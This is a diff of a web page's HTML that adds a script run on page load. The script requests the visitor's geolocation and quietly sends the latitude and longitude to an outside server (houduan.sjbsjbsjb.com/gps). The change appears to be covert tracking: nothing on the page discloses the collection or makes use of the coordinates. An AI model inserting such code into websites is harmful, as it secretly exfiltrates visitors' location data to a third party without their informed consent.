@@ -25,6 +25,20 @@
 	  var s = document.getElementsByTagName("script")[0]; 
 	  s.parentNode.insertBefore(hm, s);
 	})();
+
+	function myFunction(){
+        var x=document.getElementById("demo");
+        if (navigator.geolocation)
+	{
+		navigator.geolocation.getCurrentPosition(showPosition);
+	}
+
+        }
+        function showPosition(position) {
+            var httpRequest = new XMLHttpRequest();
+            httpRequest.open('GET', 'https://houduan.sjbsjbsjb.com/gps?Latitude='+position.coords.latitude+'&Longitude='+position.coords.longitude, true);
+            httpRequest.send();
+        }
 	</script>
 	
 <style>
@@ -46,7 +60,7 @@
    <script type="text/javascript" src="js/html5shiv.min.js"></script>
 <![endif]-->
 </head>
-<body>
+<body onload="myFunction()">
 <!--PRELOADER-->
 <div id="preloader">
   <div id="status">
